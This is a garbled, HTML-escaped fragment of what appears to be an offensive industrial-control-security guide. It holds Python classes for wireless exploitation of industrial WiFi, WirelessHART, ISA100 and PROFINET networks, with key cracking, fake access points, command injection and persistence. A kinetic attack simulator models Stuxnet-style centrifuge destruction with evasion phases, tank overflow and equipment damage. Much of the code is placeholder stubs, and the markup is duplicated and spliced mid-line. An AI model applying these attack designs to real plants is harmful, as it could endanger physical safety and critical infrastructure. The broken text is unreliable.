class=\"pl-c1\"\u003e3\u003c/span\u003e]\n            \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s\"\u003ef\"0x\u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-kos\"\u003e{\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003eindex\u003c/span\u003e:04X\u003cspan class=\"pl-kos\"\u003e}\u003c/span\u003e\u003c/span\u003e.\u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-kos\"\u003e{\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003esubindex\u003c/span\u003e:02X\u003cspan class=\"pl-kos\"\u003e}\u003c/span\u003e\u003c/span\u003e\"\u003c/span\u003e\n class=\"pl-en\"\u003eanalyze_abnormal_behavior\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003eresponse_data\u003c/span\u003e):\n codes, or protocol violations\u003c/span\u003e\n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-en\"\u003eany\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003ebyte\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e!=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e \u003cspan class=\"pl-k\"\u003efor\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003ebyte\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003ein\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eresponse_data\u003c/span\u003e[\u003cspan class=\"pl-c1\"\u003e4\u003c/span\u003e:])  \u003cspan class=\"pl-c\"\u003e# Simple heuristic\u003c/span\u003e\n        \u003cspan class=\"pl-s\"\u003e``\u003c/span\u003e`\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eAttack Methods:\u003c/strong\u003e\u003c/p\u003e\n\u003cul notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"class WirelessExploitation:\n    def __init__(self):\n        \u0026quot;\u0026quot;\u0026quot;\n        CRITICAL WIRELESS SECURITY NOTICE: This class demonstrates wireless exploitation\n        techniques for authorized industrial control system security testing ONLY.\n        \n        AUTHORIZED USE CASES:\n        - Industrial wireless network security assessment\n        - Wireless protocol vulnerability research\n        - Defensive monitoring and detection improvement\n        - Red team exercises with proper authorization\n        \n        STRICT PROHIBITIONS:\n        - Unauthorized access to wireless networks\n        - Interference with critical communications\n        - Production network testing without explicit permission\n        - Any use that violates telecommunications regulations\n        \n        REGULATORY COMPLIANCE:\n        - FCC Part 15 (Radio Frequency Device Regulations)\n        - IEC 62443 (Industrial Communication Networks Security)\n        - NIST SP 800-48 (Wireless Network Security)\n        - ISA 100.11a/WirelessHART Standards Compliance\n        \u0026quot;\u0026quot;\u0026quot;\n        self.wireless_tools = self.initialize_wireless_tools()\n        self.protocol_handlers = self.load_protocol_handlers()\n\n    def exploit_wireless_networks(self, target_facility):\n        \u0026quot;\u0026quot;\u0026quot;\n        Execute comprehensive wireless network exploitation across multiple industrial protocols.\n        Automatically discovers and classifies wireless networks before launching protocol-specific attacks.\n        \u0026quot;\u0026quot;\u0026quot;\n        # Discover all wireless networks in target facility\n        wireless_targets = self.discover_wireless_networks(target_facility)\n        exploitation_results = {}\n        \n        # Execute protocol-specific exploitation for each discovered network\n        for network in wireless_targets:\n            if network['type'] == 'wifi':\n                exploitation_results[network['ssid']] = self.exploit_wifi(network)\n            elif network['type'] == 'wirelessHART':\n                exploitation_results[network['name']] = self.exploit_wireless_hart(network)\n            elif network['type'] == 'ISA100':\n                exploitation_results[network['name']] = self.exploit_isa100(network)\n            elif network['type'] == 'profinet_wireless':\n                exploitation_results[network['name']] = self.exploit_profinet_wireless(network)\n        \n        return exploitation_results\n\n    def exploit_wifi(self, wifi_network):\n        \u0026quot;\u0026quot;\u0026quot;\n        Exploit industrial WiFi networks using security-specific attack vectors.\n        Supports enterprise, pre-shared key, and open network exploitation.\n        \u0026quot;\u0026quot;\u0026quot;\n        # Enterprise WiFi with RADIUS authentication attacks\n        if wifi_network['security'] == 'WPA2-Enterprise':\n            return self.attack_wpa2_enterprise(wifi_network)\n        \n        # Pre-shared key network attacks\n        elif wifi_network['security'] == 'WPA2-PSK':\n            return self.attack_wpa2_psk(wifi_network)\n        \n        # Open/unsecured network exploitation\n        elif wifi_network['security'] == 'Open':\n            return self.exploit_open_wifi(wifi_network)\n        \n        # Legacy security protocol handling\n        elif wifi_network['security'] == 'WEP':\n            return self.attack_wep(wifi_network)\n        \n        else:\n            return {'status': 'UNSUPPORTED_SECURITY', 'protocol': wifi_network['security']}\n\n    def attack_wpa2_enterprise(self, wifi_network):\n        \u0026quot;\u0026quot;\u0026quot;\n        Execute WPA2-Enterprise attacks targeting RADIUS authentication and certificates.\n        Includes EAP method exploitation and credential harvesting techniques.\n        \u0026quot;\u0026quot;\u0026quot;\n        attack_results = {\n            'eap_method_analysis': self.analyze_eap_methods(wifi_network),\n            'radius_server_targeting': self.identify_radius_servers(wifi_network),\n            'certificate_manipulation': self.attempt_certificate_bypass(wifi_network),\n            'credential_harvesting': self.setup_fake_access_point(wifi_network)\n        }\n        \n        return attack_results\n\n    def attack_wpa2_psk(self, wifi_network):\n        \u0026quot;\u0026quot;\u0026quot;\n        Execute WPA2-PSK attacks including handshake capture and offline cracking.\n        Supports dictionary, brute force, and advanced cryptographic attacks.\n        \u0026quot;\u0026quot;\u0026quot;\n        # Capture WPA2 handshake for offline processing\n        handshake_captured = self.capture_wpa_handshake(wifi_network)\n        \n        if handshake_captured:\n            # Attempt key recovery using multiple methods\n            key_recovery_results = {\n                'dictionary_attack': self.execute_dictionary_attack(wifi_network),\n                'brute_force_attack': self.execute_brute_force_attack(wifi_network),\n                'rainbow_table_attack': self.execute_rainbow_table_attack(wifi_network)\n            }\n            \n            return {\n                'handshake_captured': True,\n                'key_recovery_attempts': key_recovery_results,\n                'network_access': any(key_recovery_results.values())\n            }\n        else:\n            return {'handshake_captured': False, 'status': 'HANDSHAKE_CAPTURE_FAILED'}\n\n    def exploit_wireless_hart(self, network):\n        \u0026quot;\u0026quot;\u0026quot;\n        Execute comprehensive WirelessHART network exploitation.\n        Includes eavesdropping, key recovery, network joining, and command injection.\n        \u0026quot;\u0026quot;\u0026quot;\n        # Phase 1: Network eavesdropping and traffic analysis\n        captured_packets = self.eavesdrop_wireless_hart(network)\n        \n        # Phase 2: Cryptographic key recovery attempts\n        network_key = self.crack_wireless_hart_key(captured_packets)\n        \n        if network_key:\n            # Phase 3: Network infiltration as legitimate device\n            join_success = self.join_wireless_hart_network(network_key)\n            \n            # Phase 4: Malicious command injection\n            if join_success:\n                injection_results = self.inject_wireless_hart_commands(network)\n                return {\n                    'network_joined': True,\n                    'key_recovered': True,\n                    'command_injection': injection_results,\n                    'persistent_access': self.establish_persistence(network)\n                }\n        \n        return {\n            'network_joined': False,\n            'key_recovered': bool(network_key),\n            'command_injection': False\n        }\n\n    def exploit_isa100(self, network):\n        \u0026quot;\u0026quot;\u0026quot;\n        Execute ISA100.11a wireless network exploitation.\n        Focuses on mesh networking vulnerabilities and routing protocol attacks.\n        \u0026quot;\u0026quot;\u0026quot;\n        # Analyze ISA100 network topology and device relationships\n        topology = self.analyze_isa100_topology(network)\n        \n        # Exploit routing protocol vulnerabilities\n        routing_exploit = self.exploit_isa100_routing(topology)\n        \n        # Attempt device impersonation and command injection\n        if routing_exploit:\n            device_impersonation = self.impersonate_isa100_device(topology)\n            command_injection = self.inject_isa100_commands(network)\n            \n            return {\n                'routing_compromised': True,\n                'device_impersonation': device_impersonation,\n                'command_injection': command_injection,\n                'network_control': device_impersonation and command_injection\n            }\n        \n        return {'routing_compromised': False, 'status': 'ROUTING_EXPLOIT_FAILED'}\n\n    def exploit_profinet_wireless(self, network):\n        \u0026quot;\u0026quot;\u0026quot;\n        Execute Profinet wireless network exploitation.\n        Targets real-time industrial Ethernet over wireless vulnerabilities.\n        \u0026quot;\u0026quot;\u0026quot;\n        # Profinet-specific wireless attacks\n        attack_results = {\n            'real_time_traffic_analysis': self.analyze_profinet_traffic(network),\n            'cycle_time_manipulation': self.manipulate_profinet_cycle_times(network),\n            'device_enumeration': self.enumerate_profinet_devices(network),\n            'io_data_manipulation': self.manipulate_profinet_io_data(network)\n        }\n        \n        return attack_results\n\n    def discover_wireless_networks(self, target_facility):\n        \u0026quot;\u0026quot;\u0026quot;\n        Comprehensive wireless network discovery using multiple techniques.\n        Identifies and classifies industrial wireless networks in target facility.\n        \u0026quot;\u0026quot;\u0026quot;\n        discovery_methods = [\n            self.passive_scanning,\n            self.active_scanning,\n            self.spectrum_analysis,\n            self.protocol_specific_discovery\n        ]\n        \n        discovered_networks = []\n        \n        for method in discovery_methods:\n            networks = method(target_facility)\n            discovered_networks.extend(networks)\n        \n        # Remove duplicates and classify networks\n        return self.classify_networks(discovered_networks)\n\n    def initialize_wireless_tools(self):\n        \u0026quot;\u0026quot;\u0026quot;\n        Initialize specialized wireless exploitation tools and hardware.\n        Supports software-defined radio and commercial wireless adapters.\n        \u0026quot;\u0026quot;\u0026quot;\n        tools = {\n            'sdr_platforms': ['HackRF', 'USRP', 'BladeRF'],\n            'wireless_adapters': ['Alfa AWUS036ACH', 'Panda PAU06'],\n            'analysis_tools': ['Wireshark', 'Kismet', 'Aircrack-ng'],\n            'protocol_specific': ['WirelessHART Analyzer', 'ISA100 Toolkit']\n        }\n        \n        return tools\n\n    # Additional helper methods would be implemented here...\n    def eavesdrop_wireless_hart(self, network):\n        \u0026quot;\u0026quot;\u0026quot;Capture and analyze WirelessHART network communications\u0026quot;\u0026quot;\u0026quot;\n        # Implementation for WirelessHART packet capture\n        return []  # Placeholder\n\n    def crack_wireless_hart_key(self, captured_packets):\n        \u0026quot;\u0026quot;\u0026quot;Attempt to recover WirelessHART network encryption key\u0026quot;\u0026quot;\u0026quot;\n        # Implementation for key recovery\n        return None  # Placeholder\n\n    def join_wireless_hart_network(self, network_key):\n Implementation for command injection\n        return False  # Placeholder\n        ```\n\n**Target Networks:**\n- Industrial WiFi networks\n- WirelessHART systems\n- ISA100.11a networks\n- PROFINET wireless\n\n**Exploitation Techniques:**\n- Enterprise WiFi attacks\n- Network key cracking\n- Topology analysis and exploitation\n- Routing vulnerability exploitation\n\n---\n\n## SECTION 6: KINETIC ATTACK SIMULATION \u0026amp; PHYSICAL IMPACT\n\n### 6.1 ADVANCED PHYSICAL PROCESS MANIPULATION\n\n#### Digital Twin Attack Simulation\n\n#### Kinetic Attack Simulator\n\n##### Multi-Scenario Physical Impact Simulation\n- **FactoryIO Platform Integration** - Industrial simulation environment compatibility\n- **Stuxnet-Style Centrifuge Destruction** - Mechanical stress and vibration analysis\n- **Tank Overflow Scenarios** - Fluid dynamics and containment failure modeling\n- **Pump Cavitation Damage** - Hydraulic system destruction simulation\n- **Valve Manipulation Attacks** - Process flow disruption and equipment damage\n- **Motor Overload Destruction** - Electrical and mechanical failure analysis\n\n##### Attack Scenario Coverage\n- **Centrifuge Destruction** - Speed manipulation and vibration-based damage\n- **Tank Overflow** - Valve control manipulation and level monitoring bypass\n- **Pump Cavitation** - Pressure and flow manipulation for equipment damage\n- **Valve Sequencing Attacks** - Process disruption through valve state manipulation\n- **Motor Thermal Overload** - Current and temperature-based motor destruction\n\n##### Impact Analysis Metrics\n- **Cumulative Damage Tracking** - Progressive equipment degradation modeling\n- **Failure Time Prediction** - Equipment lifespan reduction calculations\n- **Detection Probability** - Monitoring system evasion effectiveness\n- **Environmental Impact** - Spill and release consequence modeling\n- **Safety System Response** - Protection layer effectiveness assessment\n\n##### Kinetic Attack Simulation Code\n\n```python\nclass KineticAttackSimulator:\n    def __init__(self, simulation_platform='FactoryIO'):\n        \u0026quot;\u0026quot;\u0026quot;\n        CRITICAL INDUSTRIAL SECURITY NOTICE: This class simulates kinetic cyber attacks\n        on industrial control systems for authorized research and defensive testing ONLY.\n        \n        AUTHORIZED USE CASES:\n        - Industrial control system resilience testing in isolated environments\n        - Red team exercises with proper oversight and authorization\n        - Physical consequence analysis and risk assessment\n        - Safety system validation and improvement\n        \n        STRICT PROHIBITIONS:\n        - NEVER use on operational industrial systems\n        - Do not deploy in production environments\n        - Ensure complete isolation from live processes\n        - Follow all safety protocols and emergency procedures\n        \n        INDUSTRY STANDARDS COMPLIANCE:\n        - ISA 95 (Enterprise-Control System Integration)\n        - IEC 62443 (Industrial Communication Networks)\n        - NIST SP 800-82 (Industrial Control System Security)\n        - OSHA 1910 (Occupational Safety and Health Standards)\n        \u0026quot;\u0026quot;\u0026quot;\n        self.platform = simulation_platform\n        self.physical_model = self.load_physical_model()\n        self.safety_systems = self.initialize_safety_monitoring()\n\n    def simulate_physical_impact_attacks(self):\n        \u0026quot;\u0026quot;\u0026quot;\n        Execute comprehensive kinetic attack simulations across multiple industrial scenarios.\n        Each scenario tests different physical impact vectors and their consequences.\n        \u0026quot;\u0026quot;\u0026quot;\n        attack_scenarios = {\n            'centrifuge_destruction': self.simulate_centrifuge_attack,\n            'tank_overflow': self.simulate_tank_overflow,\n            'pump_cavitation': self.simulate_pump_cavitation,\n            'valve_manipulation': self.simulate_valve_attack,\n            'motor_overload': self.simulate_motor_overload\n        }\n        \n        simulation_results = {}\n        \n        for scenario_name, scenario_func in attack_scenarios.items():\n            print(f\u0026quot;[*] Simulating {scenario_name.replace('_', ' ').title()}...\u0026quot;)\n            impact_metrics = scenario_func()\n            analysis_results = self.analyze_kinetic_impact(impact_metrics)\n            simulation_results[scenario_name] = analysis_results\n        \n        return simulation_results\n\n    def simulate_centrifuge_attack(self):\n        \u0026quot;\u0026quot;\u0026quot;\n        Simulate Stuxnet-style centrifuge destruction through speed manipulation.\n        Models mechanical stress accumulation and progressive equipment failure.\n        \u0026quot;\u0026quot;\u0026quot;\n        # Normal operational parameters for baseline comparison\n        normal_speed = 800  # Hz - Standard operating frequency\n        normal_vibration = 2.5  # mm/s - Acceptable vibration level\n        \n        # Attack sequence: Alternating destructive and normal operation phases\n        attack_phases = [\n            {'duration': 60, 'speed': 1410, 'vibration': 8.2},  # Destructive overspeed\n            {'duration': 30, 'speed': 800, 'vibration': 2.5},   # Normal operation (evasion)\n            {'duration': 60, 'speed': 1410, 'vibration': 9.1},  # Destructive overspeed\n        ]\n        \n        cumulative_damage = 0\n        phase_analysis = []\n        \n        for phase_num, phase in enumerate(attack_phases):\n            # Calculate mechanical stress for each attack phase\n            phase_damage = self.calculate_mechanical_stress(\n                phase['speed'], \n                phase['vibration'], \n                phase['duration']\n            )\n            cumulative_damage += phase_damage\n            \n            phase_analysis.append({\n                'phase': phase_num + 1,\n                'duration_seconds': phase['duration'],\n                'speed_hz': phase['speed'],\n                'vibration_mm_s': phase['vibration'],\n                'phase_damage': phase_damage\n            })\n        \n        return {\n            'cumulative_damage': cumulative_damage,\n            'failure_prediction': self.predict_failure_time(cumulative_damage),\n            'detection_probability': self.calculate_detection_risk(),\n            'phase_analysis': phase_analysis,\n            'equipment_replacement_cost': self.estimate_replacement_cost(),\n            'production_loss': self.calculate_production_downtime()\n        }\n\n    def simulate_tank_overflow(self):\n        \u0026quot;\u0026quot;\u0026quot;\n        Simulate tank overflow attack through outflow valve manipulation.\n        Models fluid dynamics, containment failure, and environmental impact.\n        \u0026quot;\u0026quot;\u0026quot;\n        # Physical process parameters for realistic simulation\n        tank_capacity = 10000  # liters - Maximum safe capacity\n        inflow_rate = 500      # liters/minute - Normal inflow rate\n        outflow_rate = 300     # liters/minute - Normal outflow rate\n        safety_margin = 0.9    # 90% capacity safety threshold\n        \n        # Attack simulation: Close outflow valve while maintaining inflow\n        simulation_time = 0    # minutes\n        tank_level = 5000      # liters - Starting level (50% capacity)\n        overflow_occurred = False\n        \n        while tank_level \u0026lt; tank_capacity and simulation_time \u0026lt; 120:  # 2-hour max simulation\n            simulation_time += 1  # minute increment\n            \n            # Attack: Outflow valve closed (0 outflow), normal inflow continues\n            tank_level += (inflow_rate - 0)  # Outflow valve closed by attacker\n            \n            # Check for overflow condition\n            if tank_level \u0026gt;= tank_capacity:\n                overflow_occurred = True\n                break\n        \n        if overflow_occurred:\n            return {\n                'overflow_time': simulation_time,\n                'environmental_impact': self.calculate_environmental_damage(),\n                'safety_system_response': self.check_safety_systems(),\n                'material_loss': self.calculate_material_loss(tank_level - tank_capacity),\n                'cleanup_cost': self.estimate_cleanup_operations()\n            }\n        else:\n            return {\n                'overflow_time': None,\n                'environmental_impact': 'No overflow occurred',\n                'safety_system_response': 'Systems maintained control'\n            }\n\n    def simulate_pump_cavitation(self):\n        \u0026quot;\u0026quot;\u0026quot;Simulate pump destruction through cavitation induction\u0026quot;\u0026quot;\u0026quot;\n        # Implementation for pump cavitation simulation\n        return {\n            'cavitation_severity': self.calculate_cavitation_damage(),\n            'pump_failure_time': self.predict_pump_failure(),\n            'maintenance_impact': self.assess_maintenance_requirements()\n        }\n\n    def simulate_valve_attack(self):\n        \u0026quot;\u0026quot;\u0026quot;Simulate process disruption through valve manipulation\u0026quot;\u0026quot;\u0026quot;\n        # Implementation for valve manipulation attacks\n        return {\n            'process_disruption': self.calculate_process_impact(),\n            'equipment_stress': self.assess_equipment_stress(),\n            'recovery_time': self.estimate_recovery_duration()\n        }\n\n    def simulate_motor_overload(self):\n        \u0026quot;\u0026quot;\u0026quot;Simulate motor destruction through current and thermal overload\u0026quot;\u0026quot;\u0026quot;\n        # Implementation for motor overload simulation\n        return {\n            'thermal_damage': self.calculate_thermal_stress(),\n            'insulation_failure': self.predict_insulation_failure(),\n            'replacement_cost': self.estimate_motor_replacement()\n        }\n\n    def calculate_mechanical_stress(self, speed, vibration, duration):\n        \u0026quot;\u0026quot;\u0026quot;Calculate mechanical stress accumulation based on operating conditions\u0026quot;\u0026quot;\u0026quot;\n        # Implementation would use mechanical engineering formulas\n        stress_factor = (speed / 800) ** 2 * (vibration / 2.5)  # Relative to normal\n        return stress_factor * duration\n\n    def predict_failure_time(self, cumulative_damage):\n        \u0026quot;\u0026quot;\u0026quot;Predict equipment failure time based on accumulated damage\u0026quot;\u0026quot;\u0026quot;\n        failure_threshold = 1000  # Arbitrary failure threshold for simulation\n        remaining_life = max(0, failure_threshold - cumulative_damage)\n        return remaining_life\n\n    def calculate_detection_risk(self):\n        \u0026quot;\u0026quot;\u0026quot;Calculate probability of attack detection by monitoring systems\u0026quot;\u0026quot;\u0026quot;\n        # Implementation would analyze detection system effectiveness\n        return 0.15  # 15% detection probability for simulation\n\n    def calculate_environmental_damage(self):\n        \u0026quot;\u0026quot;\u0026quot;Assess environmental impact of material release\u0026quot;\u0026quot;\u0026quot;\n        return {\n            'containment_breach': True,\n            'ecosystem_impact': 'Moderate',\n            'regulatory_violations': ['EPA Clean Water Act', 'OSHA Process Safety']\n        }\n\n    def check_safety_systems(self):\n        \u0026quot;\u0026quot;\u0026quot;Evaluate safety system response to abnormal conditions\u0026quot;\u0026quot;\u0026quot;\n        return {\n            'high_level_alarm': 'Activated',\n            'emergency_shutdown': 'Initiated', \n            'secondary_containment': 'Engaged'\n        }\n\n    def analyze_kinetic_impact(self, impact_metrics):\n        \u0026quot;\u0026quot;\u0026quot;Comprehensive analysis of kinetic attack consequences\u0026quot;\u0026quot;\u0026quot;\n        analysis = {\n            'risk_level': self.assess_risk_level(impact_metrics),\n            'business_impact': self.calculate_business_impact(impact_metrics),\n            'safety_implications': self.evaluate_safety_implications(impact_metrics),\n            'recovery_requirements': self.plan_recovery_operations(impact_metrics)\n        }\n        return analysis\n    ```\"\u003e\u003cpre\u003e\u003cspan class=\"pl-k\"\u003eclass\u003c/span\u003e \u003cspan class=\"pl-v\"\u003eWirelessExploitation\u003c/span\u003e:\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003e__init__\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        CRITICAL WIRELESS SECURITY NOTICE: This class demonstrates wireless exploitation\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        techniques for authorized industrial control system security testing ONLY.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        AUTHORIZED USE CASES:\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - Industrial wireless network security assessment\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - Wireless protocol vulnerability research\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - Defensive monitoring and detection improvement\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - Red team exercises with proper authorization\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        STRICT PROHIBITIONS:\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - Unauthorized access to wireless networks\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - Interference with critical communications\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - Production network testing without explicit permission\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - Any use that violates telecommunications regulations\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        REGULATORY COMPLIANCE:\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - FCC Part 15 (Radio Frequency Device Regulations)\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - IEC 62443 (Industrial Communication Networks Security)\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - NIST SP 800-48 (Wireless Network Security)\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - ISA 100.11a/WirelessHART Standards Compliance\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ewireless_tools\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003einitialize_wireless_tools\u003c/span\u003e()\n        \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eprotocol_handlers\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eload_protocol_handlers\u003c/span\u003e()\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003eexploit_wireless_networks\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003etarget_facility\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Execute comprehensive wireless network exploitation across multiple industrial protocols.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Automatically discovers and classifies wireless networks before launching protocol-specific attacks.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-c\"\u003e# Discover all wireless networks in target facility\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003ewireless_targets\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ediscover_wireless_networks\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003etarget_facility\u003c/span\u003e)\n        \u003cspan class=\"pl-s1\"\u003eexploitation_results\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e {}\n        \n        \u003cspan class=\"pl-c\"\u003e# Execute protocol-specific exploitation for each discovered network\u003c/span\u003e\n        \u003cspan class=\"pl-k\"\u003efor\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003enetwork\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003ein\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003ewireless_targets\u003c/span\u003e:\n            \u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003enetwork\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'type'\u003c/span\u003e] \u003cspan class=\"pl-c1\"\u003e==\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e'wifi'\u003c/span\u003e:\n                \u003cspan class=\"pl-s1\"\u003eexploitation_results\u003c/span\u003e[\u003cspan class=\"pl-s1\"\u003enetwork\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'ssid'\u003c/span\u003e]] \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eexploit_wifi\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003enetwork\u003c/span\u003e)\n            \u003cspan class=\"pl-k\"\u003eelif\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003enetwork\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'type'\u003c/span\u003e] \u003cspan class=\"pl-c1\"\u003e==\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e'wirelessHART'\u003c/span\u003e:\n                \u003cspan class=\"pl-s1\"\u003eexploitation_results\u003c/span\u003e[\u003cspan class=\"pl-c1\"\u003e==\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e'ISA100'\u003c/span\u003e:\n                \u003cspan class=\"pl-s1\"\u003eexploitation_results\u003c/span\u003e[\u003cspan class=\"pl-s1\"\u003enetwork\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'name'\u003c/span\u003e]] \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003enetwork\u003c/span\u003e)\n        \n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eexploitation_results\u003c/span\u003e\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003eexploit_wifi\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003ewifi_network\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Exploit industrial WiFi networks using security-specific attack vectors.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Supports enterprise, pre-shared key, and open network exploitation.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-c\"\u003e# Enterprise WiFi with RADIUS authentication attacks\u003c/span\u003e\n        \u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003ewifi_network\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'security'\u003c/span\u003e] \u003cspan class=\"pl-c1\"\u003e==\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e'WPA2-Enterprise'\u003c/span\u003e:\n            \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eattack_wpa2_enterprise\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003ewifi_network\u003c/span\u003e)\n        \n        \u003cspan class=\"pl-c\"\u003e# Pre-shared key network attacks\u003c/span\u003e\n        \u003cspan class=\"pl-k\"\u003eelif\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003ewifi_network\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'security'\u003c/span\u003e] \u003cspan class=\"pl-c1\"\u003e==\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e'WPA2-PSK'\u003c/span\u003e:\n            \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eattack_wpa2_psk\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003ewifi_network\u003c/span\u003e)\n        \n        \u003cspan class=\"pl-c\"\u003e# Open/unsecured network exploitation\u003c/span\u003e\n        \u003cspan class=\"pl-k\"\u003eelif\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003ewifi_network\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'security'\u003c/span\u003e] \u003cspan class=\"pl-c1\"\u003e==\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e'Open'\u003c/span\u003e:\n            \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eexploit_open_wifi\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003ewifi_network\u003c/span\u003e)\n        \n        \u003cspan class=\"pl-c\"\u003e# Legacy security protocol handling\u003c/span\u003e\n        \u003cspan class=\"pl-k\"\u003eelif\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003ewifi_network\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'security'\u003c/span\u003e] \u003cspan class=\"pl-c1\"\u003e==\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e'WEP'\u003c/span\u003e:\n            \u003cspan 